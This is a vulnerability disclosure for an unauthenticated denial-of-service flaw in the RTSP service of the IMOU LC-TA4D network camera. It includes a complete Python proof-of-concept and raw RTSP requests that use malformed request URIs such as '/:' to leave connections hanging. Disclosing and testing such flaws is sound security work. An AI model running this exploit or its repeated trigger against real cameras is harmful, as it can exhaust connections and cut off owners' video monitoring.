# IMOU LC-TA4D - Unauthenticated RTSP Resource Exhaustion via Malformed Request URI

### Information

Vendor: Hangzhou Huacheng Network Technology Co., Ltd. (IMOU / Lechange / 乐橙)

Affected Product: IMOU LC-TA4D (LC-TA4D-H10MOS) network camera

Affected Firmware Version: 3.010.0000000.1.R.250704

Vendor Homepage: [https://www.imou.com/](https://www.imou.com/)

Vendor Contact Information: [security@imou.com](mailto:security@imou.com) (Imou Security Response Center: https://www.imou.com/en/isrc/37)

![Vendor contact information](images/00_vendor_contact.png)

Affected Component: RTSP service (TCP/554)


### Description

An unauthenticated resource exhaustion vulnerability exists in the RTSP service of IMOU LC-TA4D firmware 3.010.0000000.1.R.250704. A crafted request with a malformed or overly long request URI receives no RTSP response, and the connection remains occupied. The behavior was reproduced with empty, "/:", "*", 4096-byte, 438-byte and HTTP-form request URIs across OPTIONS, DESCRIBE, SETUP and PLAY. Repeated or concurrent requests can accumulate and may exhaust RTSP connection resources, potentially causing a denial of service.

### Exploit Demo

The tested deployment uses Digest authentication, so the baseline OPTIONS returns 401. The PoC then sends `OPTIONS /: RTSP/1.0`. The trigger request receives no RTSP response within the 30-second observation window.

![PoC terminal output](images/01_poc_terminal.png)

The packet list shows the baseline 401, the trigger request with request URI `/:`, and the 30-second no-response window:

![Wireshark packet list](images/02_wireshark_packet_list.png)

The TCP stream shows the complete trigger request:

![Wireshark TCP stream](images/03_wireshark_tcp_stream.png)

The confirmed trigger surface covers the following request URI forms:

| Request URI form | Confirmed 30-second no-response positions |
|---|---|
| empty, `/:`, `*`, 4096-byte value, 438-byte `EF 83 B0` value, HTTP URI | OPTIONS_1/2, DESCRIBE, SETUP_1/2, PLAY |
| long URI values on TEARDOWN | The connection closed instead of producing a 30-second timeout; not counted as the same timeout form |

The 30-second matrix confirmed these forms across the six non-TEARDOWN positions, and the archived 438-byte form reproduced at DESCRIBE. The PoC uses `/:` on the unauthenticated OPTIONS as the representative trigger.

A 50-second screen recording of the full reproduction is provided as [04_reproduction_video.mp4](./images/04_reproduction_video.mp4). It shows the baseline 401, the `OPTIONS /:` trigger, and the 30-second no-response window.


### POC

The following standalone Python 3 PoC reproduces the representative trigger. Replace `TARGET_IP`, `USERNAME` and `PASSWORD` with the test device values. The trigger request is defined explicitly in the code.

```python
#!/usr/bin/env python3
"""IMOU LC-TA4D malformed request-URI RTSP PoC.

Hardcoded target: 192.168.1.100:554 (placeholder).
The RTSP service uses Digest authentication, so the baseline OPTIONS returns
401. The trigger is an OPTIONS request whose request URI is exactly "/:".
The trigger request receives no RTSP response within 30 seconds.
Run this file directly from VS Code.
"""

import socket
import time

TARGET_IP = "192.168.1.100"  # replace with the target camera IP
TARGET_PORT = 554
USERNAME = "REDACTED"  # replace with the account username
PASSWORD = "REDACTED"  # replace with the account password

REQUEST_INTERVAL = 1.0
RESPONSE_WAIT = 30.0
USER_AGENT = "LibVLC/3.0.24 (LIVE555 Streaming Media v2026.06.24)"

BASE = "rtsp://%s:%d/cam/realmonitor?channel=1&subtype=0" % (TARGET_IP, TARGET_PORT)

# Request 1: normal OPTIONS. 401 is the expected Digest challenge.
BASELINE_OPTIONS = (
    "OPTIONS " + BASE + " RTSP/1.0\r\n"
    "CSeq: 2\r\n"
    "User-Agent: " + USER_AGENT + "\r\n\r\n"
)

# Request 2: the trigger. The request URI is "/:".
TRIGGER_URI = "/:"
TRIGGER_REQUEST = (
    "OPTIONS " + TRIGGER_URI + " RTSP/1.0\r\n"
    "CSeq: 3\r\n"
    "User-Agent: " + USER_AGENT + "\r\n\r\n"
)


def show_payload(payload):
    text = payload if isinstance(payload, str) else payload.decode("latin-1")
    print("  send:")
    for line in text.rstrip("\r\n").split("\r\n"):
        if len(line) > 120:
            line = line[:90] + "... [%d bytes total]" % len(line)
        print("    | " + line)


def read_status(stream):
    status = stream.readline()
    if not status:
        return None
    if not status.startswith(b"RTSP/1.0 "):
        return "unexpected status line"
    headers = []
    while True:
        line = stream.readline()
        if not line:
            return None
        if line in (b"\r\n", b"\n"):
            break
        headers.append(line.decode("latin-1").rstrip("\r\n"))
    for line in headers:
        if line.lower().startswith("content-length:"):
            length = int(line.split(":", 1)[1].strip())
            remaining = length
            while remaining:
                chunk = stream.read(remaining)
                if not chunk:
                    break
                remaining -= len(chunk)
            break
    return status.decode("latin-1").strip()


def send_and_read(sock, stream, label, payload, timeout):
    print("\n" + label)
    show_payload(payload)
    time.sleep(REQUEST_INTERVAL)
    try:
        sock.sendall(payload.encode("latin-1"))
        sock.settimeout(timeout)
        status = read_status(stream)
    except socket.timeout:
        print("  -> TIMEOUT: no RTSP response within %.1fs" % timeout)
        return None
    except (OSError, ValueError) as exc:
        print("  -> %s: %s" % (type(exc).__name__, exc))
        return None
    print("  <- " + (status or "connection closed"))
    return status


def main():
    print("=" * 72)
    print("IMOU LC-TA4D malformed request-URI RTSP PoC")
    print("  target: %s:%d" % (TARGET_IP, TARGET_PORT))
    print("  trigger: OPTIONS with request URI \"/:\"")
    print("=" * 72)

    sock = socket.create_connection((TARGET_IP, TARGET_PORT), timeout=5)
    stream = sock.makefile("rb")
    try:
        status = send_and_read(
            sock, stream, "[1/2] Baseline OPTIONS", BASELINE_OPTIONS, 5.0)
        if not status:
            print("Baseline did not return a status line; aborting.")
            return
        print("  note: 401 is the normal Digest challenge.")

        print("\n" + "=" * 72)
        print(">>> TRIGGER: [2/2] OPTIONS with request URI \"/:\" <<<")
        print(">>> The malformed request should receive no RTSP response. <<<")
        print("=" * 72)
        send_and_read(
            sock, stream, "[2/2] TRIGGER OPTIONS", TRIGGER_REQUEST, RESPONSE_WAIT)
        print("\nThe malformed request receives no response and the connection remains occupied.")
        print("Repeated or concurrent requests may exhaust RTSP connection resources.")
    finally:
        try:
            stream.close()
        except OSError:
            pass
        try:
            sock.close()
        except OSError:
            pass


if __name__ == "__main__":
    main()

```

### MSG

The complete representative request sequence follows. `192.168.1.100` is a placeholder for the target address; `<realm>`, `<nonce>`, `<valid response>` and `<session>` are dynamic values. The `OPTIONS /:` request is the trigger.

```text
OPTIONS rtsp://192.168.1.100:554/cam/realmonitor?channel=1&subtype=0 RTSP/1.0
CSeq: 2
User-Agent: LibVLC/3.0.24 (LIVE555 Streaming Media v2026.06.24)

OPTIONS /: RTSP/1.0
CSeq: 3
User-Agent: LibVLC/3.0.24 (LIVE555 Streaming Media v2026.06.24)

```

### Credit

CRfuzzer
